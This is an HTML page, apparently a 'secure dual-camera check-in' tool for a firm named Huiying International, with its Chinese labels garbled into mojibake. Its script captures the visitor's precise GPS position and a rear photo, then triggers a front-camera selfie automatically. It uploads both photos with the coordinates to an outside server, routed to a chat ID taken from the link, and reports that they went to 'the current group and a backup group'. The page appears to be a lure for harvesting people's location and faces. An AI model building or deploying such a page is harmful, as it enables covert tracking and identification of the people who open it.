<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>æ±‡ç›ˆå›½é™… - å®‰å…¨åŒæ‘„æ‰“å¡</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
  body { margin:0; font-family: Arial; background:#000; color:#fff; }
  #container { position:relative; width:100vw; height:100vh; }
  video { width:100%; height:100%; object-fit:cover; }
  #overlay {
    position: absolute; bottom: 20px; left: 20px;
    background: rgba(0,0,0,0.6); padding: 12px 18px; border-radius: 10px;
    font-size: 18px; line-height: 1.5; pointer-events: none; max-width: 90%;
  }
  #controls { position: absolute; bottom: 100px; left: 50%; transform: translateX(-50%); }
  button {
    background:#fff; border:none; width:80px; height:80px; border-radius:50%;
    font-size:48px; cursor:pointer; box-shadow:0 6px 30px rgba(0,0,0,0.6);
  }
  #status { position:absolute; top:20px; left:0; right:0; text-align:center; color:#0f0; font-size:16px; padding:0 20px; }
</style>
</head>
<body>

<div id="container">
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>
  
  <div id="overlay">
    <div id="time">è·å–æ—¶é—´ä¸­...</div>
    <div id="location">ç‚¹å‡»æŒ‰é’®å¼€å§‹å®šä½ â†’</div>
  </div>

  <div id="controls">
    <button id="capture">ğŸ“¸ å¼€å§‹æ‰“å¡</button>
  </div>

  <div id="status">åŠ è½½ä¸­...</div>
</div>

<script>
// ==================== é…ç½® ====================
const BACKEND_URL = "https://huiying888.onrender.com/upload";
const urlParams = new URLSearchParams(location.search);
const TARGET_CHAT_ID = urlParams.get('chatid');
// ===============================================

let currentStream = null;
let locationGranted = false;
let step = 0; // 0=æœªå¼€å§‹, 1=æ‹åç½®, 2=æ‹å‰ç½®

// å®æ—¶æ—¶é—´
function updateTime() {
  document.getElementById('time').textContent = "ğŸ• " + new Date().toLocaleString('zh-CN', {hour12:false});
}
setInterval(updateTime, 1000);
updateTime();

// è¯·æ±‚æƒé™ + å¯åŠ¨æŒ‡å®šæ‘„åƒå¤´
async function startCamera(facingMode) {
  if (currentStream) currentStream.getTracks().forEach(t => t.stop());
  const constraints = {
    video: { facingMode: facingMode, width: {ideal: 4096}, height: {ideal: 4096} },
    audio: false
  };
  const stream = await navigator.mediaDevices.getUserMedia(constraints);
  document.getElementById('video').srcObject = stream;
  currentStream = stream;
}

// è¯·æ±‚é«˜ç²¾åº¦å®šä½ï¼ˆåªè¯·æ±‚ä¸€æ¬¡ï¼‰
async function requestLocation() {
  if (locationGranted) return;
  document.getElementById('status').textContent = "ğŸ”µ æ­£åœ¨è¯·æ±‚å®šä½æƒé™ï¼Œè¯·å…è®¸...";
  return new Promise(resolve => {
    navigator.geolocation.watchPosition(pos => {
      const lat = pos.coords.latitude.toFixed(6);
      const lng = pos.coords.longitude.toFixed(6);
      const acc = Math.round(pos.coords.accuracy);
      document.getElementById('location').innerHTML = `ğŸ“ ${lat}, ${lng}<br>ç²¾åº¦ â‰ˆ ${acc}m`;
      window.currentLocation = {lat, lng, acc};
      locationGranted = true;
      resolve();
    }, () => {
      document.getElementById('status').textContent = "âŒ è¯·å…è®¸å®šä½æƒé™";
      resolve();
    }, {enableHighAccuracy: true, timeout: 15000});
  });
}

// æ‹ç…§ + çƒ§æ°´å°
function takePhoto(view) {
  return new Promise(resolve => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth || 1920;
    canvas.height = video.videoHeight || 1080;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const now = new Date().toLocaleString('zh-CN', {hour12:false});
    const text = `${now}\nç»çº¬åº¦ï¼š${window.currentLocation.lat}, ${window.currentLocation.lng}\n${view}`;
    ctx.font = 'bold 44px Arial';
    ctx.fillStyle = 'rgba(255,255,255,0.95)';
    ctx.strokeStyle = 'black';
    ctx.lineWidth = 8;
    const lines = text.split('\n');
    let y = canvas.height - 50;
    lines.forEach(line => {
      ctx.strokeText(line, 40, y);
      ctx.fillText(line, 40, y);
      y -= 68;
    });

    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.95);
  });
}

// ä¸Šä¼ å•å¼ 
async function uploadPhoto(blob, view) {
  const form = new FormData();
  form.append('photo', blob, `${view}.jpg`);

  const url = new URL(BACKEND_URL);
  url.searchParams.set('lat', window.currentLocation.lat.toFixed(6));
  url.searchParams.set('lng', window.currentLocation.lng.toFixed(6));
  url.searchParams.set('name', 'æ±‡ç›ˆç”¨æˆ·');
  url.searchParams.set('time', Date.now());
  if (TARGET_CHAT_ID) url.searchParams.set('chatid', TARGET_CHAT_ID);

  await fetch(url, { method: 'POST', body: form });
}

// ä¸»æµç¨‹ï¼šç‚¹ä¸€æ¬¡æŒ‰é’® â†’ åç½® â†’ å‰ç½® â†’ è‡ªåŠ¨ä¸Šä¼ ä¸¤å¼ 
document.getElementById('capture').addEventListener('click', async () => {
  if (!locationGranted) {
    await requestLocation();
    if (!window.currentLocation) {
      alert("å¿…é¡»å…è®¸å®šä½æ‰èƒ½æ‰“å¡ï¼");
      return;
    }
  }

  if (step === 0) {
    // ç¬¬1æ­¥ï¼šåç½®
    document.getElementById('status').textContent = "ğŸ“¸ æ­£åœ¨æ‹æ‘„åç½®é•œå¤´...";
    await startCamera("environment");
    const backBlob = await takePhoto("åç½®è§†è§’");
    await uploadPhoto(backBlob, "back");
    step = 1;
    document.getElementById('status').textContent = "âœ… åç½®å·²ä¸Šä¼ ï¼Œè‡ªåŠ¨åˆ‡æ¢å‰ç½®...";
    setTimeout(() => document.getElementById('capture').click(), 800); // è‡ªåŠ¨è§¦å‘å‰ç½®
  } else if (step === 1) {
    // ç¬¬2æ­¥ï¼šå‰ç½®
    document.getElementById('status').textContent = "ğŸ¤³ æ­£åœ¨æ‹æ‘„å‰ç½®è‡ªæ‹...";
    await startCamera("user");
    const frontBlob = await takePhoto("å‰ç½®è‡ªæ‹");
    await uploadPhoto(frontBlob, "front");
    document.getElementById('status').innerHTML = "ğŸ‰ æ‰“å¡æˆåŠŸï¼<br>å‰åä¸¤å¼ ç…§ç‰‡å·²å‘é€åˆ°å½“å‰ç¾¤å’Œå¤‡ä»½ç¾¤";
    step = 0; // é‡ç½®
  }
});

// é¡µé¢åŠ è½½å…ˆå¯åŠ¨ä¸€ä¸ªæœ€å°æ‘„åƒå¤´ï¼ˆé¿å…æƒé™é—®é¢˜ï¼‰
navigator.mediaDevices.getUserMedia({video: true}).then(stream => {
  document.getElementById('video').srcObject = stream;
  currentStream = stream;
  document.getElementById('status').textContent = "ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å¼€å§‹æ‰“å¡ï¼ˆå…ˆæ‹åç½®å†è‡ªåŠ¨æ‹å‰ç½®ï¼‰";
}).catch(() => {
  document.getElementById('status').textContent = "è¯·å…è®¸æ‘„åƒå¤´æƒé™";
});
</script>
</body>
</html>
